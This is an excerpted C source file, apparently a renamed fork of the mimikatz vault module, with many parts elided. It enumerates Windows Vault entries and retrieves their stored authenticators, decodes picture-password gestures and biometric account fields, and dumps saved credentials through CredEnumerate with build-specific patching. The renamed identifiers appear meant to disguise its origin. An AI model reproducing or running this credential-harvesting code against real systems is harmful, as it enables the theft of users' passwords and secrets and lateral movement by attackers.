...
NTSTATUS kuhl_m_vault_list(int argc, wchar_t * argv[])
{
	...
	if(isVaultInit)
	{
		...
		if(status == STATUS_SUCCESS)
		{
			...
			{
				sekcee_stdout(L"\nVault : "); kull_m_string_displayGUID(&vaults[i]); sekcee_stdout(L"\n");
				...
				if(NT_SUCCESS(VaultOpenVault(&vaults[i], 0, &hVault)))
				{
					...
					{
						sekcee_stdout(L"\tItems (%u)\n", cbItems);
						for(j = 0; j < cbItems; j++)
						{
							if(SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) // to fix !
							{
								items7 = (PVAULT_ITEM_7) items;
								sekcee_stdout(L"\t %2u.\t%s\n", j, items7[j].FriendlyName);
								sekcee_stdout(L"\t\tType            : "); kull_m_string_displayGUID(&items7[j].SchemaId); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tLastWritten     : "); kull_m_string_displayLocalFileTime(&items7[j].LastWritten); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tFlags           : %08x\n", items7[j].Flags);

								sekcee_stdout(L"\t\tRessource       : "); kuhl_m_vault_list_descItemData(items7[j].Ressource); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tIdentity        : "); kuhl_m_vault_list_descItemData(items7[j].Identity); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tAuthenticator   : "); kuhl_m_vault_list_descItemData(items7[j].Authenticator); sekcee_stdout(L"\n");

								if(isAttr)
								{
									for(k = 0; k < items7[j].cbProperties; k++)
									{
										sekcee_stdout(L"\t\tProperty %2u     : ", k); kuhl_m_vault_list_descItemData(items7[j].Properties + k); sekcee_stdout(L"\n");
									}
								}
								pItem7 = NULL;
								status = VaultGetItem7(hVault, &items7[j].SchemaId, items7[j].Ressource, items7[j].Identity, NULL, 0, &pItem7);

								sekcee_stdout(L"\t\t*Authenticator* : ");
								if(status == STATUS_SUCCESS)
							...
							else
							{
								...
								sekcee_stdout(L"\t\tType            : "); kull_m_string_displayGUID(&items8[j].SchemaId); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tLastWritten     : "); kull_m_string_displayLocalFileTime(&items8[j].LastWritten); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tFlags           : %08x\n", items8[j].Flags);

								sekcee_stdout(L"\t\tRessource       : "); kuhl_m_vault_list_descItemData(items8[j].Ressource); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tIdentity        : "); kuhl_m_vault_list_descItemData(items8[j].Identity); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tAuthenticator   : "); kuhl_m_vault_list_descItemData(items8[j].Authenticator); sekcee_stdout(L"\n");
								sekcee_stdout(L"\t\tPackageSid      : "); kuhl_m_vault_list_descItemData(items8[j].PackageSid); sekcee_stdout(L"\n");

								if(isAttr)
								{
									for(k = 0; k < items8[j].cbProperties; k++)
									{
										sekcee_stdout(L"\t\tProperty %2u     : ", k); kuhl_m_vault_list_descItemData(items8[j].Properties + k); sekcee_stdout(L"\n");
									}
								}
								pItem8 = NULL;
	...
	if(enumItem8->Properties && (enumItem8->cbProperties > 0) && enumItem8->Properties + 0)
	{
		...
		case 0x0b4b8a12b:	// picture
			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
			{
				...
				if(bgPath)
				{
					sekcee_stdout(L"\t\tBackground path : %s\n", bgPath);
					LocalFree(bgPath);
				}
				sekcee_stdout(L"\t\tPicture password (grid is 150*100)\n");
				...
				for(i = 0; i < 3; i++)
				{
					...
					{
					case PP_Point:
						sekcee_stdout(L"point  (x = %3u ; y = %3u)", pElements[i].point.coord.x, pElements[i].point.coord.y);
						break;
					case PP_Circle:
						sekcee_stdout(L"circle (x = %3u ; y = %3u ; r = %3u) - %s", pElements[i].circle.coord.x, pElements[i].circle.coord.y, pElements[i].circle.size, (pElements[i].circle.clockwise ? L"clockwise" : L"anticlockwise"));
						break;
					case PP_Line:
						sekcee_stdout(L"line   (x = %3u ; y = %3u) -> (x = %3u ; y = %3u)", pElements[i].line.start.x, pElements[i].line.start.y, pElements[i].line.end.x, pElements[i].line.end.y);
						break;
					default:
						sekcee_stdout(L"%u\n", pElements[i].Type);
					}
		...
		case 0x0fec87291:	// biometric
			if((enumItem8->Properties + 0)->Type == ElementType_ByteArray)
			{
				...
				sekcee_stdout(L"\t\tProperty        : ");
				if(bElements->domainnameLength > 1)
					sekcee_stdout(L"%.*s\\", bElements->domainnameLength - 1, bufferStart + bElements->usernameLength);
				if(bElements->usernameLength > 1)
					sekcee_stdout(L"%.*s", bElements->usernameLength - 1, bufferStart);
				sekcee_stdout(L"\n");
			}
			break;
		default:
			sekcee_stdout(L"todo ?\n");
		}
	}
}
...
void kuhl_m_vault_list_descVault(HANDLE hVault)
{
	...
	RtlZeroMemory(&information, sizeof(VAULT_INFORMATION));
	information.type = (SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) ? VaultInformation_Path_7 : VaultInformation_Path_8;
	if(NT_SUCCESS(VaultGetInformation(hVault, 0, &information)))
	{
		sekcee_stdout(L"\tPath       : %s\n", information.string ? information.string : L"temp vault");
		VaultFree(information.string);
	}
}
...
void kuhl_m_vault_list_descItemData(PVAULT_ITEM_DATA pData)
{
	if(pData)
	{
		...
		case ElementType_UnsignedShort:
			sekcee_stdout(L"[USHORT] %hu", pData->data.UnsignedShort);
			break;
		case ElementType_UnsignedInteger:
			sekcee_stdout(L"[DWORD] %u", pData->data.UnsignedInt);
			break;
		case ElementType_String:
			sekcee_stdout(L"[STRING] %s", pData->data.String);
			break;
		case ElementType_ByteArray:
			sekcee_stdout(L"[BYTE*] ");
...
NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
{
	...
	{
		if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, ARRAYSIZE(CredpCloneCredentialReferences), SEKCEE_NT_BUILD_NUMBER))
		{
	...
	else
	{
		do
		{
			if(CredEnumerate(NULL, flags, &credCount, &pCredential))
			{
				...
				{
					sekcee_stdout(L"TargetName : %s / %s\n"
						L"UserName   : %s\n"
						L"Comment    : %s\n"
						L"Type       : %u - %s\n"
						L"Persist    : %u - %s\n"
			...
			flags++;
		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (SEKCEE_NT_MAJOR_VERSION > 5));
	}
	return STATUS_SUCCESS;
}